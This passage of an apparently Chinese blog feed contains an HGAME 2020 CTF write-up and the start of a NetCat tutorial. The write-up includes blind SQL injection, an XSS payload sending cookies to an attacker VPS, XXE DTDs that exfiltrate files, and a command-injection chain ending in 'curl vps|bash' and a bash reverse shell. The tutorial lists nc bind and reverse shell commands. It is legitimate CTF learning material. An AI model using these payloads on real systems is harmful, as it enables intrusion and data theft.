class="keyword">CAST</span>(<span class="keyword">name</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>) <span class="keyword">FROM</span> babysql.<span class="string">`user`</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">3</span>,<span class="number">1</span>),<span class="number">5</span>,<span class="number">1</span>))&gt;<span class="number">47</span>) <span class="keyword">THEN</span> <span class="keyword">SLEEP</span>(<span class="number">4</span>) <span class="keyword">ELSE</span> <span class="number">6131</span> <span class="keyword">END</span>)</span><br></pre></td></tr></table></figure><h4 id="Cosmos的聊天室2-0"><a href="#Cosmos的聊天室2-0" class="headerlink" title="Cosmos的聊天室2.0"></a>Cosmos的聊天室2.0</h4><p>这道题试了好久，后来才发现有CSP</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure><p>它限制了内联 JS 脚本，并且限制了引⼊的静态资源⽂件只能从同域下加载。在实际应⽤中，遇到这种CSP⼀般是找该站是否有⽂件上传点，也可以同源下有没有可以执⾏任意 JS 代码的 evil.js ⽂件</p><p>题目的过滤很简单，双写就可以绕过，题目有个接⼝<code>/send</code>，它会返回过滤后的消息内容，并且是GET请求方式，所以可以构造下面的payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scriscriptpt</span> <span class="attr">src</span>=<span class="string">&quot;/send?message=window.open(&#x27;http://yourvps/?&#x27;%2bdocument.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">scscriptript</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意<code>+</code>号要url编码为<code>%2b</code></p><h3 id="misc-2"><a href="#misc-2" class="headerlink" title="misc"></a>misc</h3><h4 id="美-人-鲸"><a href="#美-人-鲸" class="headerlink" title="美 人 鲸"></a>美 人 鲸</h4><p>这题是个docker镜像，先pull下来</p><p>然后运行并进入容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -t -i 31ab18768617 /bin/sh</span><br></pre></td></tr></table></figure><p>搜索一下文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag*</span><br></pre></td></tr></table></figure><p>找到<code>/usr/share/man/man8/flag.tar.gz</code>，先拷贝出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp ba61f2585d31:/usr/share/man/man8/flag.tar.gz /home/ubuntu/Desktop/<span class="comment">#字符串为容器id</span></span><br></pre></td></tr></table></figure><p>解压发现<code>README</code>里有<code>See sh history.</code>，再进入容器</p><p>发现再<code>/root</code>目录下有<code>.ash_history</code>文件</p><p>里面有<code>echo -e &quot;Zip password is somewhere else in /etc.\nFind it!&quot;</code> </p><p>提示我们zip密码再<code>/etc</code>下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rn <span class="string">&quot;Zip&quot;</span> /etc</span><br></pre></td></tr></table></figure><p>-r是递归方式查找目录，-n显示行号</p><p>在issue文件找到zip密码，<code>Zip Password: cfuzQ3Gd6gqKG@$N</code></p><p>解压得到<code>flag.db</code>，直接记事本或者Navicat查看得到flag</p><h4 id="三重隐写"><a href="#三重隐写" class="headerlink" title="三重隐写"></a>三重隐写</h4><p>解压附件，<code>You know LSB.wav</code>，猜测wav的lsb隐写，可以直接用工具<strong>SilentEye</strong></p><p>下载链接：<a href="https://silenteye.v1kings.io/download.html?i2">https://silenteye.v1kings.io/download.html?i2</a></p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200203230927.png" style="zoom:80%;"><p>得到：<code>Stegano key: uFSARLVNwVIewCY5</code></p><p>试了试，发现<code>上裏与手抄卷.mp3</code>是MP3Stego隐写，密码是我们之间得到的</p><p>得到：<code>Zip Password: VvLvmGjpJ75GdJDP</code></p><p>解压压缩包得到<code>flag.crypto</code>，安装附件中的工具，发现需要密码</p><p>对于<code>Unlasting.mp3</code>，使用foremost分离出一张png图片，binwalk好像分离不出来</p><p>是Pdf417的二维码扫码，在线网址：<a href="https://online-barcode-reader.inliteresearch.com/[](https://online-barcode-reader.inliteresearch.com/)">https://online-barcode-reader.inliteresearch.com/[](https://online-barcode-reader.inliteresearch.com/)</a></p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200204102453.png" style="zoom:80%;"><p>用<code>EncryptoforWin.exe</code>输入密码解密即可得flag</p><h4 id="日常"><a href="#日常" class="headerlink" title="日常"></a>日常</h4><p>三个文件，<code>Blind.png</code>，<code>Origin_pixivArtwork75992170.png</code>，<code>橫豎撇點折_av85002656.ogg</code></p><p>两张图片相同，猜测是盲水印，直接用<code>bwm</code>，地址：<a href="https://github.com/chishaxie/BlindWaterMark">https://github.com/chishaxie/BlindWaterMark</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python bwm.py decode Blind.png Origin_pixivArtwork75992170.png flag.png</span><br></pre></td></tr></table></figure><p>好像看不太清，用<code>StegSolve</code>切换一下</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200204113634.png" style="zoom: 200%;"><p>内容为：<code>VeraCrypt Password is X0YA1GDuZF$echCy</code></p><p><code>橫豎撇點折_av85002656.ogg</code>binwalk分离出一个<code>Container</code>文件，用<code>VeraCrypt</code>解密</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200204125357.png" style="zoom:80%;"><p>然后发现有三个文件</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200205155637.png" style="zoom:80%;"><p>和3ctf流量分析题相似，参考：<a href="http://www.gtfly.top/2019/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1-%E5%86%B0%E8%9D%8E-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.[html](http://www.gtfly.top/2019/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1-%E5%86%B0%E8%9D%8E-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.html)">http://www.gtfly.top/2019/11/18/记一次-冰蝎-一句话木马流量分析.[html](http://www.gtfly.top/2019/11/18/记一次-冰蝎-一句话木马流量分析.html)</a></p><p><code>Cookies</code>文件是从Chrome浏览器导出的文件，在保存时，Chrome先将密码进行DPAPI加密，再保存在SQLite数据库文件中，因此这是一个SQLite数据库文件</p><p>再介绍几个概念：</p><p>chrome33以上对Cookies进行了加密，value变为空，增加了加密的<strong>encrypted_value</strong>字段，字段类型是<strong>BLOB</strong>，这个便是我们需要解密的内容</p><p><strong>Master Key：</strong></p><p>64字节，用于解密DPAPI BLOB</p><p>通过用户登录密码、SID和16字节随机数加密后保存在Master Key file中</p><p><strong>Master Key file：</strong></p><p>二进制文件，可使用用户登录密码对其解密，获得Master Key</p><p><strong>SID（Security Identifiers，SID）：</strong></p><p>安全标识符，是标识用户、组和计算机帐户的唯一的号码。在第一次创建该帐户时，将给网络上的每一个帐户发布一个唯一的 SID。Windows 2000 中的内部进程将引用帐户的 SID 而不是帐户的用户或组名。如果创建帐户，再删除帐户，然后使用相同的用户名创建另一个帐户，则新帐户将不具有授权给前一个帐户的权力或权限，原因是该帐户具有不同的 SID 号。</p><p><code>ObjectNF-PC.txt</code>是<code>mimikatz</code>导出的结果，密码我们能解出来</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200205163047.png" style="zoom:80%;"><p>我们现在先导出<code>BLOB</code></p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200205163525.png" style="zoom: 67%;"><p>然后用<code>Windows Password Recovery</code></p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200205163733.png" style="zoom: 67%;"><p>选择导出要解密的<code>BLOB</code></p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200205163846.png" style="zoom: 67%;"><p>选择<code>Master Key file</code>，即<code>S-1-5-21-3375469711-1363829938-1291733684-1001.zip</code>压缩包中的文件，这个文件好像没法在文件夹里显示，只需复制文件名，会自动匹配文件</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200205164105.png" style="zoom:67%;"><p>填写SID和密码</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200205164405.png" style="zoom:67%;"><p>得到flag</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200205164456.png" style="zoom:67%;"><h4 id="智械危机（-1"><a href="#智械危机（-1" class="headerlink" title="智械危机（#1)"></a>智械危机（#1)</h4><p>服务端程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">true_flag = <span class="string">&#x27;hgame&#123;&#125;&#x27;</span></span><br><span class="line">flag = np.loadtxt(<span class="string">&#x27;flag.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">threshold = <span class="number">0.18</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mse</span>(<span class="params">true, predict</span>):</span></span><br><span class="line">    <span class="keyword">return</span> np.average(np.abs(true - predict))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judge</span>(<span class="params">predict</span>):</span></span><br><span class="line">    <span class="keyword">if</span> mse(flag, predict) &lt; threshold:</span><br><span class="line">        print(true_flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Unfortunately! Your mse loss is over the threshold, try again!&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;Wrong flag!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    print(<span class="string">&quot;Welcome to this game!&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;Please input your flag here (separated by space please):&quot;</span>)</span><br><span class="line">    inp=input()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        inp = np.asarray(inp.split(<span class="string">&#x27; &#x27;</span>), dtype=float)</span><br><span class="line">        judge(inp)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;Internal Error!&quot;</span>)</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> keras.models <span class="keyword">as</span> models</span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line">model = models.load_model(<span class="string">&#x27;flag.hdf5&#x27;</span>)</span><br><span class="line"><span class="comment"># model.summary()</span></span><br><span class="line">weights = model.get_layer(index=<span class="number">1</span>).get_weights()</span><br><span class="line">W = weights[<span class="number">0</span>]</span><br><span class="line">b = weights[<span class="number">1</span>]</span><br><span class="line">y = np.loadtxt(<span class="string">&#x27;enc_flag.txt&#x27;</span>)</span><br><span class="line">W_data = tf.placeholder(tf.float32, [<span class="number">128</span>, <span class="number">64</span>])</span><br><span class="line">target = tf.placeholder(tf.float32, [<span class="number">64</span>])</span><br><span class="line">X_op = tf.Variable(tf.truncated_normal([<span class="number">1</span>, <span class="number">128</span>]))</span><br><span class="line">pred = tf.matmul(tf.sigmoid(X_op), W_data)</span><br><span class="line">loss = tf.reduce_mean(tf.abs(target - pred))</span><br><span class="line">optimizer = tf.train.AdamOptimizer(learning_rate=<span class="number">1e-3</span>)</span><br><span class="line">train_op = optimizer.minimize(loss)</span><br><span class="line"><span class="keyword">with</span> tf.Session() <span class="keyword">as</span> sess:</span><br><span class="line">sess.run(tf.global_variables_initializer())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">_, loss_value = sess.run([train_op, loss],feed_dict=&#123;W_data: W, target: y - b&#125;)</span><br><span class="line"><span class="keyword">if</span> i % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">print(i, loss_value)</span><br><span class="line">result = np.array(sess.run(X_op))</span><br><span class="line">result[result &gt; <span class="number">0.5</span>] = <span class="number">1</span></span><br><span class="line">result[result &lt; <span class="number">0.5</span>] = <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h2><h3 id="web-3"><a href="#web-3" class="headerlink" title="web"></a>web</h3><h4 id="代打出题人服务中心"><a href="#代打出题人服务中心" class="headerlink" title="代打出题人服务中心"></a>代打出题人服务中心</h4><p>不难发现是XXE</p><p><strong>payload:</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://yourvps/exp1.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">msg</span>&gt;</span><span class="tag">&lt;<span class="name">id</span>&gt;</span>moonback<span class="tag">&lt;/<span class="name">id</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>aasd<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">level</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">level</span>&gt;</span><span class="tag">&lt;<span class="name">time</span>&gt;</span>415441<span class="tag">&lt;/<span class="name">time</span>&gt;</span><span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>vps上：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;yourvps:9001?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>服务器监听9001端口就可以读文件了，读取<code>/etc/hosts</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1localhost</span><br><span class="line">::1localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0ip6-localnet</span><br><span class="line">ff00::0ip6-mcastprefix</span><br><span class="line">ff02::1ip6-allnodes</span><br><span class="line">ff02::2ip6-allrouters</span><br><span class="line">172.21.0.76hgame-private</span><br><span class="line">172.21.0.31f9f1b9b99e13</span><br></pre></td></tr></table></figure><p>发现<code>172.21.0.76</code>比较特殊，试着访问，这里有个tips:</p><p>当使⽤ libxml 读取⽂件内容的时候，⽂件不能过⼤，如果太⼤就会报错⽆法得到⽂件内容，因此需要使⽤ php过滤器的⼀个压缩的⽅法zlib.deflflate</p><p>所以vps上构造：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;zlib.deflate&#x2F;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;172.21.0.76&#x2F;?token&#x3D;12335565&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;yourvps:9001?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>然后我们就能得到压缩后的东西，只需</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;php://filter/read=convert.base64-decode/zlib.inflate/resource=a&#x27;</span>);</span><br></pre></td></tr></table></figure><p>就能得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$token = @$_GET[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($token)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;请带上您的队伍token访问! /?token=&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$api = <span class="string">&quot;http://checker/?token=&quot;</span>.$token;</span><br><span class="line">$t = file_get_contents($api);</span><br><span class="line"><span class="keyword">if</span>($t !== <span class="string">&quot;ok&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;队伍token错误&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$sandbox = <span class="string">&#x27;/var/www/html/sandbox/&#x27;</span>. md5(<span class="string">&quot;hgame2020&quot;</span> . $token);;</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line">$content = $_GET[<span class="string">&#x27;v&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($content)) &#123;</span><br><span class="line">    $cmd = substr($content,<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">    system($cmd);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;r&#x27;</span>])) &#123;</span><br><span class="line">    system(<span class="string">&#x27;rm -rf ./*&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*   _____ _    _ ______ _      _        _____ ______ _______   _____ _______   _</span></span><br><span class="line"><span class="comment">  / ____| |  | |  ____| |    | |      / ____|  ____|__   __| |_   _|__   __| | |</span></span><br><span class="line"><span class="comment"> | (___ | |__| | |__  | |    | |     | |  __| |__     | |      | |    | |    | |</span></span><br><span class="line"><span class="comment">  \___ \|  __  |  __| | |    | |     | | |_ |  __|    | |      | |    | |    | |</span></span><br><span class="line"><span class="comment">  ____) | |  | | |____| |____| |____ | |__| | |____   | |     _| |_   | |    |_|</span></span><br><span class="line"><span class="comment"> |_____/|_|  |_|______|______|______( )_____|______|  |_|    |_____|  |_|    (_)</span></span><br><span class="line"><span class="comment">                                    |/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>可以看出来是限制5字符的命令执行，由于没有说flflag在哪，因此需要反弹shell⽅便找flag的位置</p><p>在linux中，⼀条命令可以通过符号 \ 分割为多⾏不影响执⾏结果。如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ubuntu:~<span class="comment"># cat test</span></span><br><span class="line">ec\</span><br><span class="line">ho \</span><br><span class="line">hello!</span><br><span class="line">ubuntu:~<span class="comment"># sh test</span></span><br><span class="line">hello!</span><br></pre></td></tr></table></figure><p>因此我们可以利⽤这个特性，将超⻓的命令分割为多段来执⾏。</p><p>为了让服务器记住我们先前所输⼊的命令⽚段，我们可以利⽤重定向符 <code>&gt;</code> <code>&gt;&gt;</code> 来在当前⽬录创建⽂件。</p><p>⽂件名即为我们所需的命令⽚段。</p><p>为了让创建的⽂件按照我们想要的顺序排列，可以使⽤ <code>ls -t</code> 使得⽂件按照创建时间先后排序。</p><p>⽽ <code>ls -t&gt;a</code> 超⻓度限制，因此我们需要⽤ <code>ls&gt;_</code> 来构造出 <code>ls -t&gt;a</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;ls\\<span class="comment">#写ls\文件，会转义所以用两个</span></span><br><span class="line">ls&gt;_<span class="comment">#列举文件，将ls\写入_文件</span></span><br><span class="line">&gt;\ \\<span class="comment">#写空格\文件</span></span><br><span class="line">&gt;-t\\<span class="comment">#写-t\文件&gt;》</span></span><br><span class="line">&gt;\&gt;y<span class="comment">#写&gt;y文件</span></span><br><span class="line">ls&gt;&gt;_<span class="comment">#将文件名追加到_文件内</span></span><br></pre></td></tr></table></figure><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/20180916180041-5f019c22-b997-1.png" style="zoom:80%;"><p>反弹shell直接用bash反弹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/0.0.0.0/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>这段不太容易构造，因此我们可以构造</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">curl vps|bash</span><br><span class="line"></span><br><span class="line">&gt;bash</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;0\\</span><br><span class="line">&gt;0.\\</span><br><span class="line">&gt;0.\\</span><br><span class="line">&gt;0.\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;rl\\</span><br><span class="line">&gt;cu\\</span><br><span class="line">sh _</span><br><span class="line">sh y</span><br></pre></td></tr></table></figure><p>然后就可以弹shell拿flag了</p><p>也可以写个脚本，服务器上放个php，接收post过来的dtd并存在文件中，注意：</p><ol><li>命令要用原生字符串</li><li>注意生成的文件有重复的没(我的服务器ip会生成两个7.文件，然后一直弹不了shell,没办法只能用域名了)</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> HAGAME </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NetCat,Nmap,WireShack工具使用</title>
      <link href="2020/01/23/nc-nmap%E5%92%8Cwireshack%E4%BD%BF%E7%94%A8/"/>
      <url>2020/01/23/nc-nmap%E5%92%8Cwireshack%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了NetCat,Nmap,WireShack三个工具使用详情！</p><a id="more"></a><h2 id="NetCat"><a href="#NetCat" class="headerlink" title="NetCat"></a>NetCat</h2><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-g&lt;网关&gt;：设置路由器跃程通信网关，最多设置8个；</span><br><span class="line">-G&lt;指向器数目&gt;：设置来源路由指向器，其数值为4的倍数；</span><br><span class="line">-h：帮助；</span><br><span class="line">-i&lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口；</span><br><span class="line">-l：使用监听模式，监控传入的资料；</span><br><span class="line">-n：直接使用ip地址，而不通过域名服务器；</span><br><span class="line">-o&lt;输出文件&gt;：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存；</span><br><span class="line">-p&lt;通信端口&gt;：设置本地主机使用的通信端口；</span><br><span class="line">-r：指定源端口和目的端口都进行随机的选择；</span><br><span class="line">-s&lt;来源位址&gt;：设置本地主机送出数据包的IP地址；</span><br><span class="line">-u：使用UDP传输协议；</span><br><span class="line">-v：显示指令执行过程；</span><br><span class="line">-w&lt;超时秒数&gt;：设置等待连线的时间；</span><br><span class="line">-z：使用0输入&#x2F;输出模式，只在扫描通信端口时使用</span><br></pre></td></tr></table></figure><h3 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h3><h4 id="正向"><a href="#正向" class="headerlink" title="正向"></a>正向</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">被控端：nc -lp 333 -c bash</span><br><span class="line">攻击端：nc 1.1.1.1 333</span><br></pre></td></tr></table></figure><h4 id="反向"><a href="#反向" class="headerlink" title="反向"></a>反向</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">被控端：nc 1.1.1.1 333 -c bash</span><br><span class="line">攻击端：nc -lp 333</span><br></pre></td></tr></table></figure><p>注：Windows⽤户把bash改成cmd</p><h3 id="传输文件"><a href="#传输文件" class="headerlink" title="传输文件"></a>传输文件</h3><p>也有两种方式</p><p><strong>方式1：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">接收端：nc -lp 333 &gt; 1.mp4</span><br><span class="line">发送端：nc -nv 1.1.1.1 333 &lt; 1.mp4 –q 1</span><br></pre></td></tr></table></figure><p><strong>方式2：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">接收端：nc -nv 1.1.1.1 333 &gt; a.mp4</span><br><span class="line">发送端：nc -q 1 -lp 333 &lt; a.mp4</span><br></pre></td></tr></table></figure><p><strong>传输目录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 